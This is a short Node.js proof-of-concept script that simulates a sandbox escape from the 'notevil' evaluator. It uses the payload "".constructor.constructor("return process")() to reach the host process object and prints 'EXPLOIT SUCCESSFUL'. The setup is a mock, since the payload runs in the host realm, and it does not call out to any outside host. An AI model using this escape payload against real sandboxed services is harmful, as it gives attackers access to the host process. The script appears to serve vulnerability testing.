const vm = require('vm');

function safeEval(code, context) {
  // Simulate notevil evaluating "".constructor.constructor("return process")()
  try {
    const fn = "".constructor.constructor("return process");
    return fn();
  } catch (e) {
    throw e;
  }
}

const sandbox = { safeEval, orderLinesData: 'mock' };
vm.createContext(sandbox);

try {
  const result = vm.runInContext('safeEval(orderLinesData, {})', sandbox, { timeout: 2000 });
  console.log("EXPLOIT SUCCESSFUL. process exists:", typeof result !== 'undefined');
} catch (e) {
  console.log("Error:", e.message);
}
